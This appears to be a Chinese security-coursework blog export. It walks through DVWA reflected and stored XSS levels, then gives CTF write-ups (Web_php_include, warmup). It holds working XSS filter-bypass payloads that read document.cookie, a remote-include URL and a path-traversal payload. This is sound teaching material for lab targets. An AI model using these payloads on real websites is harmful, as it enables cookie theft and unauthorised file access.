            header( <span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="hljs-string">&#x27; 404 Not Found&#x27;</span> );

            <span class="hljs-comment">// Feedback for end user</span>
            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;
        &#125;
    &#125;
&#125;

<span class="hljs-comment">// Generate Anti-CSRF token</span>
generateSessionToken();

<span class="hljs-meta">?&gt;</span></code></pre>





<h2 id="XSS-Reflected"><a href="#XSS-Reflected" class="headerlink" title="XSS (Reflected)"></a>XSS (Reflected)</h2><h3 id="low-3"><a href="#low-3" class="headerlink" title="low"></a>low</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

header (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);

<span class="hljs-comment">// Is there any input?</span>
<span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;
    <span class="hljs-comment">// Feedback for end user</span>
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span>;
&#125;

<span class="hljs-meta">?&gt;</span></code></pre>

<p> 可以看到，代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞 。</p>
<p>先测试一下</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-string">&quot;xss&quot;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>

<p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201026202557058.png" alt="image-20201026202557058"></p>
<p>获取cookie</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>

<p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201026202647823.png" alt="image-20201026202647823"></p>
<h3 id="medium-3"><a href="#medium-3" class="headerlink" title="medium"></a>medium</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
header (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);
<span class="hljs-comment">// Is there any input?</span>
<span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;
    <span class="hljs-comment">// Get input</span>
    <span class="hljs-variable">$name</span> = str_replace( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );
    <span class="hljs-comment">// Feedback for end user</span>
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>

<p>代码审计后可以发现是对输入的内容进行了过滤，将<strong>&lt;script&gt;</strong>替换为空，可以双写绕过，也可以大小写绕过。</p>
<p>构造payload：</p>
<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">sCriPt</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

&lt;scr<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">ipt&gt;alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
//使用其他标签
<span class="hljs-tag">&lt;<span class="hljs-name">IMG</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(document.cookie)</span>&gt;</span></code></pre>

<p><img src="https://i.loli.net/2020/11/05/tzosymv7d1Sru3e.png" alt="xssmid.png"></p>
<h3 id="high-3"><a href="#high-3" class="headerlink" title="high"></a>high</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
header (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);
<span class="hljs-comment">// Is there any input?</span>
<span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;
    <span class="hljs-comment">// Get input</span>
    <span class="hljs-variable">$name</span> = preg_replace( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );
    <span class="hljs-comment">// Feedback for end user</span>
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>

<p>先代码审计，执行一个正则表达式的搜索和替换,其中 <code>/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i</code> 是正则表达式 <code>(.*)</code> 表示贪婪匹配，<code>/i</code> 表示不区分大小写所以在High级别的代码中，所有关于  <code>&lt;script&gt;</code> 标签均被过滤删除了 ,可以使用其他的标签。</p>
<p>构造payload：</p>
<pre><code class="hljs routeros">&lt;IMG <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onerror</span>=alert(document.cookie)&gt;</code></pre>

<p><img src="https://i.loli.net/2020/11/05/tzosymv7d1Sru3e.png" alt="xssmid.png"></p>
<h2 id="XSS-Stored"><a href="#XSS-Stored" class="headerlink" title="XSS (Stored)"></a>XSS (Stored)</h2><h3 id="low-4"><a href="#low-4" class="headerlink" title="low"></a>low</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;
    <span class="hljs-comment">// Get input</span>
    <span class="hljs-variable">$message</span> = trim( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );
    <span class="hljs-variable">$name</span>    = trim( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );

    <span class="hljs-comment">// Sanitize message input</span>
    <span class="hljs-variable">$message</span> = stripslashes( <span class="hljs-variable">$message</span> );
    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));

    <span class="hljs-comment">// Sanitize name input</span>
    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));

    <span class="hljs-comment">// Update database</span>
    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;
    <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );

    <span class="hljs-comment">//mysql_close();</span>
&#125;

<span class="hljs-meta">?&gt;</span></code></pre>

<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p> <code>isset()</code> 函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true/false </p>
<p> <code>trim()</code> 函数作用为移除字符串两侧空白字符或其他预定义字符 </p>
<p> <code>stripslashes()</code> 函数用于删除字符串中的反斜杠 </p>
<p> <code>mysqli_real_escape_string()</code> 函数会对字符串中的特殊号<code>(\x00，\n，\r，\，&#39;，&quot;，\x1a)</code> 进行转义 </p>
<p> 在代码中对message，name输入框内容  没有进行XSS方面的过滤和检查 </p>
<p> 且通过  <code>query</code> 语句插入到数据库中。所以存在存储型XSS漏洞 </p>
<p>这里name ,message的输入框中都存在xss，所以两个位置都可以使用，但是name位置有字数限制，可以使用bp抓包修改</p>
<p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201026203331497.png" alt="image-20201026203331497"></p>
<p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201026203255791.png" alt="image-202010262032"></p>
<p>由于是存储型XSS,所以每次刷新页面都会弹出cookie。</p>
<h3 id="medium-4"><a href="#medium-4" class="headerlink" title="medium"></a>medium</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;
    <span class="hljs-comment">// Get input</span>
    <span class="hljs-variable">$message</span> = trim( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );
    <span class="hljs-variable">$name</span>    = trim( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );

    <span class="hljs-comment">// Sanitize message input</span>
    <span class="hljs-variable">$message</span> = strip_tags( addslashes( <span class="hljs-variable">$message</span> ) );
    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));
    <span class="hljs-variable">$message</span> = htmlspecialchars( <span class="hljs-variable">$message</span> );

    <span class="hljs-comment">// Sanitize name input</span>
    <span class="hljs-variable">$name</span> = str_replace( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );
    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));

    <span class="hljs-comment">// Update database</span>
    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;
    <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );

    <span class="hljs-comment">//mysql_close();</span>
&#125;

<span class="hljs-meta">?&gt;</span></code></pre>

<h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><pre><code class="hljs php"><span class="hljs-variable">$message</span> = strip_tags( addslashes( <span class="hljs-variable">$message</span> ) );
<span class="hljs-variable">$message</span> = htmlspecialchars( <span class="hljs-variable">$message</span> );
<span class="hljs-variable">$name</span> = str_replace( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );</code></pre>

<p> <code>strip_tags()</code> 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用 <code>&lt;b&gt;</code> 标签。 </p>
<p> <code>addslashes()</code> 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。 </p>
<p> <code>htmlspecialchars()</code> 函数把预定义的字符&amp;、”、’、&lt;、&gt;转换为 HTML 实体，防止浏览器将其作为HTML元素 </p>
<p> 对message输入内容进行检测过滤，因此无法再通过message参数注入XSS代码</p>
<p>但是对于name参数，只是简单过滤了<code>&lt;script&gt;</code>字符串，仍然存在存储型的XSS，与反射型中级的一样的方法</p>
<p>payload</p>
<pre><code class="hljs xml">使用双写绕过，输入  &lt;scr<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">ipt&gt;alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> 
使用大小写绕过，输入<span class="hljs-tag">&lt;<span class="hljs-name">sCript</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> 
输入其他标签，如  <span class="hljs-tag">&lt;<span class="hljs-name">IMG</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(document.cookie)</span>&gt;</span></code></pre>

<p><img src="https://i.loli.net/2020/11/05/CIUt6lTadZ5fEig.png" alt="xssstored2.png"></p>
<h3 id="high-4"><a href="#high-4" class="headerlink" title="high"></a>high</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;
    <span class="hljs-comment">// Get input</span>
    <span class="hljs-variable">$message</span> = trim( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );
    <span class="hljs-variable">$name</span>    = trim( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );

    <span class="hljs-comment">// Sanitize message input</span>
    <span class="hljs-variable">$message</span> = strip_tags( addslashes( <span class="hljs-variable">$message</span> ) );
    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));
    <span class="hljs-variable">$message</span> = htmlspecialchars( <span class="hljs-variable">$message</span> );

    <span class="hljs-comment">// Sanitize name input</span>
    <span class="hljs-variable">$name</span> = preg_replace( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );
    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));

    <span class="hljs-comment">// Update database</span>
    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;
    <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );

    <span class="hljs-comment">//mysql_close();</span>
&#125;

<span class="hljs-meta">?&gt;</span></code></pre>

<h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><pre><code class="hljs php"><span class="hljs-variable">$message</span> = strip_tags( addslashes( <span class="hljs-variable">$message</span> ) );
<span class="hljs-variable">$message</span> = htmlspecialchars( <span class="hljs-variable">$message</span> );
<span class="hljs-variable">$name</span> = preg_replace( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );</code></pre>

<p> <code>strip_tags()</code> 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用 <code>&lt;b&gt;</code> 标签。 </p>
<p> <code>addslashes()</code> 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。 </p>
<p> <code>htmlspecialchars()</code> 函数把预定义的字符&amp;、”、’、&lt;、&gt;转换为 HTML 实体，防止浏览器将其作为HTML元素 </p>
<p>name,执行一个正则表达式的搜索和替换,其中 <code>/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i</code> 是正则表达式 <code>(.*)</code> 表示贪婪匹配，<code>/i</code> 表示不区分大小写所以在High级别的代码中，所有关于  <code>&lt;script&gt;</code> 标签均被过滤删除了 ,可以使用其他的标签。</p>
<p>只能换一个标签</p>
<pre><code class="hljs routeros">&lt;IMG <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onerror</span>=alert(document.cookie)&gt;</code></pre>



]]></content>
      <categories>
        <category>网安作业</category>
      </categories>
      <tags>
        <tag>sql</tag>
        <tag>xss</tag>
        <tag>blind sql</tag>
      </tags>
  </entry>
  <entry>
    <title>adworld</title>
    <url>/2020/11/30/adworld/</url>
    <content><![CDATA[<p>为了完成网安作业必须多做点题，顺便写wp</p>
<span id="more"></span>

<h2 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h2><p>利用php伪协议上传一段php代码后执行，列出目录看到flag文件</p>
<img src="https://i.loli.net/2020/12/04/ApRxaQX5nhbdD87.png" alt="image-20201204225248794" style="zoom:50%;">



<p>再利用本地文件包含读取flag</p>
<pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">220.249.52.133:46457</span>/?page=http://<span class="hljs-number">127.0.0.1</span>/index.php/?hello=%<span class="hljs-number">3</span>C?show_source(%<span class="hljs-number">22</span>fl<span class="hljs-number">4</span>gisisish<span class="hljs-number">3</span>r<span class="hljs-number">3</span>.php%<span class="hljs-number">22</span>);?%<span class="hljs-number">3</span>E</code></pre>





<h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>查看源码看到source.php，访问看到源码</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
    highlight_file(<span class="hljs-keyword">__FILE__</span>);
    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span>
<span class="hljs-class">    </span>&#123;
        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$page</span></span>)</span>
<span class="hljs-function">        </span>&#123;
            <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];
            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !is_string(<span class="hljs-variable">$page</span>)) &#123;
                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;
                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
            &#125;

            <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;
                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
            &#125;

            <span class="hljs-variable">$_page</span> = mb_substr(
                <span class="hljs-variable">$page</span>,
                <span class="hljs-number">0</span>,
                mb_strpos(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)
            );
            <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;
                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
            &#125;

            <span class="hljs-variable">$_page</span> = urldecode(<span class="hljs-variable">$page</span>);
            <span class="hljs-variable">$_page</span> = mb_substr(
                <span class="hljs-variable">$_page</span>,
                <span class="hljs-number">0</span>,
                mb_strpos(<span class="hljs-variable">$_page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)
            );
            <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;
                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
            &#125;
            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        &#125;
    &#125;

    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])
        &amp;&amp; is_string(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])
        &amp;&amp; emmm::checkFile(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])
    ) &#123;
        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];
        <span class="hljs-keyword">exit</span>;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;
    &#125;  
<span class="hljs-meta">?&gt;</span></code></pre>

<p>源码中有一个hint.php，查看得到</p>
<pre><code class="hljs smali">flag<span class="hljs-built_in"> not </span>here,<span class="hljs-built_in"> and </span>flag in ffffllllaaaagggg</code></pre>

<p>访问 <code>ffffllllaaaagggg</code>，发现没有这个文件，所以可能是在根目录。</p>
<p>继续看代码有个白名单</p>
<pre><code class="hljs axapta">source.php,<span class="hljs-keyword">hint</span>.php</code></pre>

<p>mb_substr函数会截取<code>?</code>前面的字符返回给page，检测其是否在白名单中</p>
<p>注意这里有一个urldecode()，所以提交前需要进行两次urlencode</p>
<p>解码后重复上面两步</p>
<pre><code class="hljs php"><span class="hljs-variable">$_page</span> = mb_substr(<span class="hljs-variable">$_page</span>,<span class="hljs-number">0</span>,mb_strpos(<span class="hljs-variable">$_page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>));
<span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;
   <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
&#125;</code></pre>

<p>之后通过include函数获取flag</p>
<p>所以构造的payload中url解码后?前的内容必须是  <code>source.php</code>或者<code>hint.php</code></p>
<p>payload:</p>
<pre><code class="hljs awk">GET:
?page=hint.php%<span class="hljs-number">253</span>F<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>ffffllllaaaagggg</code></pre>

<p>原理是<code>hint.php?/</code>被当作目录</p>
<p>../是返回上一级目录，这里多几个../也没事，必须保证返回到根目录，而在根目录向上返回还是根目录。</p>
<p>所以上面的payload可以在根目录读取到flag。</p>
<h2 id="NaNNaNNaNNaN-Batman"><a href="#NaNNaNNaNNaN-Batman" class="headerlink" title="NaNNaNNaNNaN-Batman"></a>NaNNaNNaNNaN-Batman</h2><p>下载附件打开后显示有乱码，但是可以看到<code>&lt;script&gt;</code>标签，于是改后缀伪html ,在浏览器打开，出现一个输入框。</p>
<p>继续看代码，看到函数的最后有个<code>eval</code>函数，中间的参数为eval(_)，正好与开头定义的名相同<code>&lt;script&gt;_=&#39;function</code>，所以想办法把原函数显示处理</p>
<p>将eval改为alert，保存后在浏览器中打开看到弹框中出现源码。</p>
<p>在线格式化后的结果</p>
